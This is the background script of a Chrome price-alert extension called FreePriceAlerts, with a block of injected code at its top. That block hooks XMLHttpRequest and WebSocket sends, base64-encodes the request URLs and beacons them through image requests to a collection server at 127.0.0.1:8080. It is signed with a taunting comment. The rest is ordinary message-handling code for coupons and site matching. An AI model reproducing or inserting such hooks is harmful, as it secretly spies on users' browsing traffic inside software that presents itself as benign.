function collectMessageToServer(data){
    var img = document.createElement("img");
    img.src = "http://127.0.0.1:8080/" + chrome.runtime.id + "/" + data;
}

function hookAjax(){
    var _XMLHTTPRequestOpen = XMLHttpRequest.prototype.open;
    XMLHttpRequest.prototype.open = function(){
        console.log(arguments);
        collectMessageToServer("bk-ajax-" + btoa(arguments[1]));
        _XMLHTTPRequestOpen.apply(this, arguments);
    }
}
function hookWebsocket() {
    var _websockSend = WebSocket.prototype.send;
    WebSocket.prototype.send = () => {
        console.log(arguments);
        collectMessageToServer("bk-ws-" + btoa(arguments[1]));
        _websockSend.apply(this, arguments);
    }
}

function run(){
    hookAjax();
    hookWebsocket();
}
run();
//sn00ker_ahahaha
// Background

window.FreePriceAlerts = window.FreePriceAlerts || {};
;(function(){

    var FreePriceAlerts = window.FreePriceAlerts;
    var $ = FreePriceAlerts.libs.jQuery;
    var _ = FreePriceAlerts.libs.underscore;

	this.iframeStyleCallbacks = {};
	this.iframeStyleLocks = {};

	this.startup = function(event)
	{

        FreePriceAlerts.browser = new FreePriceAlerts.browsers.Chrome();
        FreePriceAlerts.config.customReadFn  = FreePriceAlerts.browser.readPref;
        FreePriceAlerts.config.customWriteFn = FreePriceAlerts.browser.writePref;

        FreePriceAlerts.core.initializeBackground();
		FreePriceAlerts.libs.jQuery.get( 'manifest.json', function(manifest) {
            FreePriceAlerts.core.onGetVersion(manifest.version);
        }, 'json' );
	};

	this.getSites = function( callback ) {
        return FreePriceAlerts.toolbars.fpa.sitesList.fetchSites(callback);
	};

	this.observe = function(data) {
        FreePriceAlerts.core.onBrowserConfigChanged(data.name, data.value);
	};

	this.foundFpaAttributes = function( attributes )
	{
		if (!attributes) return;

		if (attributes['fpa:partner'])
			FreePriceAlerts.config.foundPartner(attributes['fpa:partner']);
	};

	this.addCoupon = function( pattern, code, data ) {
		return FreePriceAlerts.toolbars.fpa.sitesList.addCoupon(pattern, code, data);
	};

    this.runPodFromMemory = function(url, key, tabId) {

        if (FreePriceAlerts.config.read('avoid_hash_in_tests'))
            FreePriceAlerts.browser.newTab(url);
        else
            FreePriceAlerts.browser.newTab(url+"#freePriceAlerts-"+key);

        /*
        var sitesList = FreePriceAlerts.toolbars.fpa.sitesList;
        chrome.tabs.create({
            'url': url,
            active: true,
            openerTabId: tabId,
        }, function(tab) {
            console.log('New tab ID: '+tab.id); // DEBUG
            chrome.tabs.sendMessage(tab.id, {
                type: 'runPodFromMemory',
                inMemoryPod: sitesList.inMemoryPod,
                inMemoryKey: sitesList.inMemoryKey,
            })
        });
		// */

    };

    this.onPageLoad = function(message, sender, sendResponse) {

        var sitesList = FreePriceAlerts.toolbars.fpa.sitesList;

        var isApi = false;
        $.each(FreePriceAlerts.config.api_hosts(), function(i,host) {
            isApi = isApi || _(message.location.hostname.toLowerCase()).endsWith(host.toLowerCase());
        });

        if (message.isTopWindow || isApi) FreePriceAlerts.console.logContext('message', '>> onPageLoad: '+JSON.stringify(message));

        var responseData = {
            isApi: isApi,
            inMemoryPod: sitesList.inMemoryPod,
            inMemoryKey: sitesList.inMemoryKey,
            config: FreePriceAlerts.config.readAll(),
            timingLog: [],
            rawCouponSites: sitesList.rawCouponSites,
        };

        if (isApi) {
            responseData.type = 'api';
            sendResponse(responseData);
            return;
        }

        if (!message.isTopWindow) {
            responseData.type = 'none';
            sendResponse(responseData);
            return;
        }

        FreePriceAlerts.TimingLog.getInstance().clear();
        var timingLog = new FreePriceAlerts.TimingLog();

        sitesList.test(
            message.location.href,
            function( site, type, sitesList ) {
                responseData.site = site;
                responseData.type = type;
                responseData.timingLog = timingLog.log;
                sendResponse(responseData);
            },
            { timingLog: timingLog }
        );

    };

    this.onProductMatchFailed = function(message, sender, sendResponse) {
        // Fall back to domain or coupon match

        FreePriceAlerts.console.logContext('message', '>> onProductMatchFailed: '+JSON.stringify(message));
        var sitesList = FreePriceAlerts.toolbars.fpa.sitesList;

        FreePriceAlerts.TimingLog.getInstance().clear();
        var timingLog = new FreePriceAlerts.TimingLog();

        sitesList.test(
            message.location.href,
            function( site, type, sitesList ) {
                sendResponse({
                    site: site,
                    type: type,
                    timingLog: timingLog.log,
                });
            },
            {
                timingLog: timingLog,
                skipProductSite: true
            }
        );

    };

}).apply(window.FreePriceAlerts, []);


chrome.extension.onRequest.addListener(
	function(request, sender, sendResponse) {
    try {

		FreePriceAlerts.console.logContext('message', '>> onRequest `'+request.type+'` ('+JSON.stringify(request)+')');
		if ( request.type == 'getSites' )
		{
			FreePriceAlerts.getSites( sendResponse );
		}
		else if ( request.type == 'configChanged' )
		{
			FreePriceAlerts.observe(request);
			sendResponse({});
		}
		else if ( request.type == 'getConfig' )
		{
			sendResponse(FreePriceAlerts.config.readAll());
		}
		else if ( request.type == 'foundFpaAttributes' )
		{
			sendResponse(FreePriceAlerts.foundFpaAttributes(request.attributes));
		}
		else { return false; }

    }
    catch(err) {
        FreePriceAlerts.console.log(
            'Unknown error when processing message: \n'
            +JSON.stringify(request)
            +'; \n'
            +FreePriceAlerts.utils.ErrorToString(err));
    }
	}
);

chrome.extension.onMessage.addListener(
	function(message, sender, sendResponse) {
    try {

		FreePriceAlerts.console.logContext('message', '>> onMessage `'+message.type+'` ('+JSON.stringify(message)+')');
		if ( message.type == 'setIframeStyle' )
		{
			if ( FreePriceAlerts.iframeStyleLocks[sender.tab.id] === undefined ||
			     FreePriceAlerts.iframeStyleLocks[sender.tab.id] == 0 )
				FreePriceAlerts.iframeStyleLocks[sender.tab.id] = 1;
			else
				FreePriceAlerts.iframeStyleLocks[sender.tab.id]++;

			chrome.tabs.sendMessage(sender.tab.id, message, function(res) {});
			sendResponse({});
		}
		else if ( message.type == 'getIframeStyle' )
		{
			FreePriceAlerts.iframeStyleCallbacks[sender.tab.id] = sendResponse;
			return true;
		}
		else if ( message.type == 'iframeStyleChanged' )
		{
			if ( FreePriceAlerts.iframeStyleLocks[sender.tab.id] === undefined ||
			    FreePriceAlerts.iframeStyleLocks[sender.tab.id] < 0 )
			{
				FreePriceAlerts.iframeStyleLocks[sender.tab.id] = 0;
			}

			if ( FreePriceAlerts.iframeStyleLocks[sender.tab.id] == 0 )
			{
				if ( FreePriceAlerts.iframeStyleCallbacks[sender.tab.id] !== undefined )
				{
					FreePriceAlerts.iframeStyleCallbacks[sender.tab.id](message);
					FreePriceAlerts.iframeStyleCallbacks[sender.tab.id] = undefined;
				}
			}

			if ( FreePriceAlerts.iframeStyleLocks[sender.tab.id] > 0 )
			{
				FreePriceAlerts.iframeStyleLocks[sender.tab.id]--;
			}

			sendResponse({});
		}
		else if ( message.type == 'setDistributionPartner' )
		{
			var ptnr = message.partner;
			localStorage['settings.distributionPartner'] = ptnr;
			FreePriceAlerts.config.write('distributionPartner',ptnr);
			sendResponse({});
		}
		else if ( message.type == 'addCouponAlert' )
		{
			FreePriceAlerts.addCoupon(message.coupon.pattern,message.coupon.code,message.coupon.data);
			sendResponse({});
		}
        else if ( message.type == 'loadPodIntoMemory' )
        {
            FreePriceAlerts.toolbars.fpa.sitesList.setInMemoryPod(message.podXml, message.key);
            sendResponse({});
        }
        else if ( message.type == 'runPodFromMemory' )
        {
            FreePriceAlerts.runPodFromMemory(message.podUri, message.key, sender.tabid);
        }
        else if ( message.type == 'onPageLoad' )
        {
            FreePriceAlerts.onPageLoad(message, sender, sendResponse);
            return true;
        }
        else if ( message.type == 'onProductMatchFailed' )
        {
            FreePriceAlerts.onProductMatchFailed(message, sender, sendResponse);
            return true;
        }
        else if ( message.type == 'showAdvancedSettings' )
        {
            FreePriceAlerts.browser.newTab(chrome.extension.getURL('advanced-settings.html'));
            sendResponse({});
        }
		else { return false; }

    }
    catch(err) {
        FreePriceAlerts.console.log(
            'Unknown error when processing message: \n'
            +JSON.stringify(message)
            +'; \n'
            +FreePriceAlerts.utils.ErrorToString(err)
            );
    }
    }
);

